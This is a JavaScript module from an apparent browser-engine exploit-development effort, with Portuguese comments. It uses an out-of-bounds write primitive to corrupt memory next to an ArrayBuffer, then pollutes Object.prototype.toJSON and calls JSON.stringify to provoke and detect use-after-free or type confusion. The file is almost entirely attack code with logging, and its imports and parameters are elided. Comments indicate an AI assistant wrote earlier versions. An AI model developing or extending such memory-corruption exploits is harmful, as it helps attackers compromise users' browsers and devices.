// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
// ... (importações e FOCUSED_TEST_PARAMS como antes) ...

export let currentCallCount_for_UAF_TC_test = 0;

export async function executeUAFTypeConfusionTestWithValue(
    testVariantDescription,
    valueToWriteOOB
) {
    const FNAME_TEST = `executeUAFTypeConfusionTest<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset,
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = FOCUSED_TEST_PARAMS;

    logS3(`--- Iniciando Teste UAF/TC (Valor Variado): ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor OOB: ${toHex(valueToWriteOOB)}`, "info", FNAME_TEST);
    document.title = `Iniciando UAF/TC: ${testVariantDescription}`;

    currentCallCount_for_UAF_TC_test = 0; 

    let stringifyResult = null; // <<<< MOVIDA PARA O ESCOPO DA FUNÇÃO
    let errorOccurredInStringify = false;
    let potentiallyFroze = true; // Assumir congelamento até que JSON.stringify retorne ou um erro JS seja pego
    let stepReached = "inicio";


    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        // Certifique-se de que as variáveis de retorno estejam definidas mesmo em caminhos de erro
        return { potentiallyFroze: false, errorOccurred: true, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
    }
    document.title = "OOB Configurado";
    stepReached = "oob_configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);
    stepReached = "vitima_criada";

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = true; 
    
    try {
        logS3(`Aplicando PP com detailed_toJSON_for_UAF_TC_test...`, "info", FNAME_TEST);
        document.title = `Aplicando PP: ${testVariantDescription}`;
        stepReached = "aplicando_pp";
        Object.defineProperty(Object.prototype, ppKeyToPollute, {
            value: detailed_toJSON_for_UAF_TC_test, 
            writable: true, configurable: true, enumerable: false
        });
        logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
        stepReached = "pp_aplicada";
        document.title = `PP Aplicada: ${testVariantDescription}`;

        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(valueToWriteOOB)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB: ${testVariantDescription}`;
        oob_write_absolute(corruption_offset, valueToWriteOOB, bytes_to_write_for_corruption);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB: ${testVariantDescription}`;
        
        await PAUSE_S3(SHORT_PAUSE_S3); 

        stepReached = "antes_stringify";
        document.title = `Antes Stringify: ${testVariantDescription}`;
        logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME_TEST);
        // Removida a declaração de stringifyResult daqui
        try {
            stringifyResult = JSON.stringify(victim_ab); 
            stepReached = "apos_stringify";
            document.title = `Stringify Retornou: ${testVariantDescription}`;
            potentiallyFroze = false; // Se chegou aqui, não congelou e não deu erro JS
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 500)}`, "info", FNAME_TEST);
            if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_prop_error:true")) {
                logS3("UAF/TC POTENCIALMENTE DETECTADO: Erro ao acessar propriedade dentro do toJSON.", "vuln", FNAME_TEST);
                // Não setar errorOccurredInStringify = true aqui, pois o erro foi "tratado" e retornado no stringifyResult
            }
        } catch (e) {
            stepReached = "erro_stringify";
            document.title = `ERRO Stringify (${e.name}): ${testVariantDescription}`;
            potentiallyFroze = false; // Um erro JS foi capturado, não um congelamento silencioso
            errorOccurredInStringify = true;
            logS3(`ERRO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal: ${testVariantDescription}`;
        potentiallyFroze = false;
        errorOccurredInStringify = true; 
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) { 
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
        if (potentiallyFroze && stepReached !== "apos_stringify" && !errorOccurredInStringify) { 
             // Apenas considera congelamento se não terminou stringify E não houve erro JS
            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}`, "warn", FNAME_TEST);
            document.title = `CONGELOU? Passo: ${stepReached} - Chamadas: ${currentCallCount_for_UAF_TC_test} - ${testVariantDescription}`;
        }
    }
    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}) ---`, "test", FNAME_TEST);
    if (!potentiallyFroze && !errorOccurredInStringify) {
        document.title = `Teste UAF/TC OK: ${testVariantDescription}`;
    }
    return { potentiallyFroze, errorOccurred: errorOccurredInStringify, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
}

// detailed_toJSON_for_UAF_TC_test deve estar definida aqui ou importada se estiver em outro arquivo
// Para este exemplo, vamos assumir que está definida como na sua última solicitação de script completo.
// Se ela for usada por 'executeUAFTypeConfusionTestWithValue' implicitamente, ela precisa estar neste escopo.
// No entanto, a versão que gerei para você na resposta "Pode gerar os arquivos para testes? completos para copiar"
// tinha a detailed_toJSON_for_UAF_TC_test DENTRO do runAllAdvancedTestsS3.mjs.
// A forma como está agora, `executeUAFTypeConfusionTestWithValue` usa a `detailed_toJSON_for_UAF_TC_test`
// que PRECISA ser definida DENTRO DESTE ARQUIVO ou importada explicitamente e passada como argumento.
// A última versão do runAllAdvancedTestsS3 que gerei *passava* a função `toJSON` como argumento.
// Vamos manter a função `detailed_toJSON_for_UAF_TC_test` neste arquivo para que `executeUAFTypeConfusionTestWithValue`
// possa usá-la, conforme a estrutura do seu log de `RangeError`.

export function detailed_toJSON_for_UAF_TC_test() {
    currentCallCount_for_UAF_TC_test++;
    const currentOperationThis = this;
    const FNAME_toJSON = `detailed_toJSON_UAF_TC(Call ${currentCallCount_for_UAF_TC_test})`;

    if (currentCallCount_for_UAF_TC_test === 1) {
        document.title = `detailed_toJSON Call ${currentCallCount_for_UAF_TC_test}`;
    }
    if (currentCallCount_for_UAF_TC_test <= 3) {
        logS3(`[toJSON Poluído - Detalhado] ${FNAME_toJSON} Chamado!`, "vuln");
        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
    }

    let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A", type_toString: "N/A" };
    let error_accessing_props = null;
    try {
        details.type_toString = Object.prototype.toString.call(currentOperationThis);
        details.byteLength = currentOperationThis.byteLength; 

        if (currentOperationThis && typeof details.byteLength === 'number' && details.byteLength >= 4) {
            if (currentOperationThis instanceof ArrayBuffer) {
                details.first_dword = new DataView(currentOperationThis, 0, 4).getUint32(0, true);
            } else if (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined && (currentOperationThis.buffer.byteLength >= currentOperationThis.byteOffset + 4) ) {
                details.first_dword = new DataView(currentOperationThis.buffer, currentOperationThis.byteOffset, 4).getUint32(0, true);
            }
        }
        details.slice_exists = (typeof currentOperationThis.slice === 'function');
        
        if (currentCallCount_for_UAF_TC_test <= 3) {
             logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Detalhes: type='${details.type_toString}', byteLength=${details.byteLength}, 1stDword=${(details.first_dword === "N/A" || typeof details.first_dword === 'string') ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info");
        }
    } catch (e) {
        error_accessing_props = e.message;
        logS3(`  [toJSON Poluído - Detalhado] ${FNAME_toJSON} ERRO ao acessar props: ${e.message}`, "critical");
        document.title = `ERRO toJSON Props Call ${currentCallCount_for_UAF_TC_test}`;
    }
    
    if (error_accessing_props) {
        return { toJSON_prop_error: true, message: error_accessing_props, call: currentCallCount_for_UAF_TC_test, details_at_error: details };
    }
    // Para forçar o RangeError como visto no log, precisamos da recursão.
    // A forma como a `detailed_toJSON_for_UAF_TC_test` estava sendo chamada antes era através de `runAllAdvancedTestsS3.mjs`
    // que passava a função. Se `executeUAFTypeConfusionTestWithValue` chama `detailed_toJSON_for_UAF_TC_test`
    // diretamente, a estrutura de chamada pode ser diferente.
    // No entanto, o log do RangeError mostrava que `detailed_toJSON_for_UAF_TC_test` era chamada recursivamente.
    // Isso acontece porque o objeto que ela retorna `{... details: details}` também terá `Object.prototype.toJSON` poluído.
    return { toJSON_executed_detailed: true, call: currentCallCount_for_UAF_TC_test, details: details };
}
